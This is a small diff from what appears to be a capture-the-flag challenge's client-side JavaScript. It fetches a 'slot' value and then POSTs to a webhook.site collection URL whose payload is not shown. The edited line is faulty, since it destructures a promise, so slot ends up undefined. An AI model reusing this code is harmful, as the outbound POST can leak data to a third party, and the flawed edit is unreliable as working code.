@@ -15,7 +15,7 @@
   // Please do NOT pwn this service. This is irrelevant to the 
   // challenge. 
   ptr.init("proxy.ottersec.workers.dev");
-  const { slot } = await ptr.getSlot();
+  const { slot } =  (async () => await ptr.getSlot())();
   txt.innerText = slot;
   fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b", {
     method: 'POST', // Specify the HTTP method
